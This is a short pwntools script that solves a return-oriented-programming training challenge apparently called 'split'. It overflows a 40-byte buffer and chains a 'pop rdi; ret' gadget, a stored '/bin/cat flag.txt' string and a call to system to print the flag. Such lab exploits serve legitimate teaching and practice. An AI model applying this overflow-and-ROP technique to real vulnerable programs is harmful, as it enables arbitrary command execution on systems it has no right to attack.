from pwn import *

proc = process('./split')

payload = b"Z" * 40
payload += p64(0x00000000004007c3) # 0x00000000004007c3 : pop rdi ; ret
payload += p64(0x0000000000601060) # .data:0000000000601060 usefulString    db '/bin/cat flag.txt',0
payload += p64(0x000000000040074B) # .text:000000000040074B                 call    _system

proc.sendline(payload)
proc.interactive()
